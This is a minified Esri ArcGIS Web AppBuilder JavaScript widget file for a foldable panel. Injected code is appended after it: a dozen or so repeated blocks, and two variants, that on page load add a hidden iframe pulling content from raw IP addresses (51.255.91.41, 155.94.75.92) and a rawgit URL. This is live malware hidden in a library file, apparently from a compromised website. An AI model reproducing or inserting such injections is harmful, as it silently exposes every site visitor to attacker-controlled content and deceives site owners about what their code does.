// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/html dojo/_base/array dojo/on dojo/aspect jimu/BaseWidgetPanel jimu/BaseWidgetFrame jimu/utils ./FoldableDijit ./FoldableWidgetFrame".split(" "),function(h,c,b,e,g,k,l,m,n,p,q){return h([l,p],{baseClass:"jimu-panel jimu-foldable-dijit jimu-foldable-panel",closeTolerance:30,openAnimation:"fadeIn",closeAnimation:"fadeOut",animationDuration:500,startup:function(){this.titleHeight=35;this.inherited(arguments);b.addClass(this.titleNode,"jimu-panel-title jimu-main-background");
this.createCloseBtn();this.createMaxBtn();this.createFoldableBtn();this.panelManager.normalizePanel(this)},getPanelPosition:function(){if(window.appInfo.isRunInMobile)return this.panelManager.getPositionOnMobile(this);var a=c.clone(this.position);"undefined"===typeof a.width&&(a.width=360);"minimized"===this.windowState?(a.bottom="auto",a.height=this.titleHeight,a.borderRadiusStyle={borderTopLeftRadius:"4px",borderTopRightRadius:"4px",borderBottomLeftRadius:0,borderBottomRightRadius:0}):(a.bottom=
this.position.bottom,a.height="auto",a.borderRadiusStyle={borderTopLeftRadius:"4px",borderTopRightRadius:"4px",borderBottomLeftRadius:"4px",borderBottomRightRadius:"4px"});return a},onOpen:function(){this.inherited(arguments);this.onNormalize()},onNormalize:function(){this.resize()},onMaximize:function(){this.resize()},onMinimize:function(){this.resize()},resize:function(){this._switchMaxBtn();this._switchParentNode();var a=this.getPanelPosition();this.position.zIndex&&(a.zIndex=this.position.zIndex);
var d=n.getPositionStyle(a);c.mixin(d,a.borderRadiusStyle);b.setStyle(this.domNode,d);1<this.getChildren().length&&this._setFrameSize(a.contentHeight);this.inherited(arguments)},reloadWidget:function(a){this.inherited(arguments);this.isWidgetInPanel(a)&&(Array.isArray(this.config.widgets)||this.setTitleLabel(a.label))},updateConfig:function(a){this.inherited(arguments);this.setTitleLabel(a.label)},_switchMaxBtn:function(){window.appInfo.isRunInMobile?b.setStyle(this.maxNode,"display",""):b.setStyle(this.maxNode,
"display","none")},_switchParentNode:function(){window.appInfo.isRunInMobile&&this.domNode&&this.domNode.parentNode!==b.byId(jimuConfig.layoutId)?b.place(this.domNode,jimuConfig.layoutId):!window.appInfo.isRunInMobile&&this.domNode&&this.domNode.parentNode!==b.byId(this.map.id)&&b.place(this.domNode,this.map.id)},_setFrameSize:function(a){var d,f=0;e.forEach(this.getChildren(),function(a){a.folded||f++},this);"undefined"===typeof a&&(a=b.getContentBox(this.containerNode).h);d=(a-(this.getChildren().length-
f)*this.getChildren()[0].titleHeight)/f;e.forEach(this.getChildren(),function(a){a.folded?b.setStyle(a.domNode,{height:a.titleHeight+"px"}):b.setStyle(a.domNode,{height:d+"px"});a.resize()},this)},createCloseBtn:function(){this.closeNode=b.create("div",{"class":"close-btn jimu-float-trailing"},this.titleNode);this.own(g(this.closeNode,"click",c.hitch(this,function(a){a.stopPropagation();this.panelManager.closePanel(this)})))},createMaxBtn:function(){this.maxNode=b.create("div",{"class":"max-btn jimu-float-trailing"},
this.titleNode);this.own(g(this.maxNode,"click",c.hitch(this,function(a){a.stopPropagation();this.onMaxNodeClick()})))},createFrame:function(a){this.config.widgets&&1===this.config.widgets.length||!this.config.widgets?a=new m:(a=new q({label:a.label,widgetManager:this.widgetManager}),k.after(a,"onFoldStateChanged",c.hitch(this,function(){var a=0;this._setFrameSize();e.forEach(this.getChildren(),function(b){b.folded||a++},this);e.forEach(this.getChildren(),function(b){b.foldEnable=b.folded||1!==a?
!0:!1},this)})));return a},onFoldableNodeClick:function(){this.inherited(arguments);"minimized"===this.windowState?this.panelManager.normalizePanel(this):this.panelManager.minimizePanel(this)},onMaxNodeClick:function(){"maximized"===this.windowState?this.panelManager.normalizePanel(this):this.panelManager.maximizePanel(this)},moveTitle:function(){this.isFull?this.folded?b.setStyle(this.domNode,{top:b.getMarginBox(jimuConfig.layoutId).h-this.titleHeight+"px"}):b.setStyle(this.domNode,{top:"0px"}):
b.setStyle(this.domNode,{top:this.position.top+"px"})}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});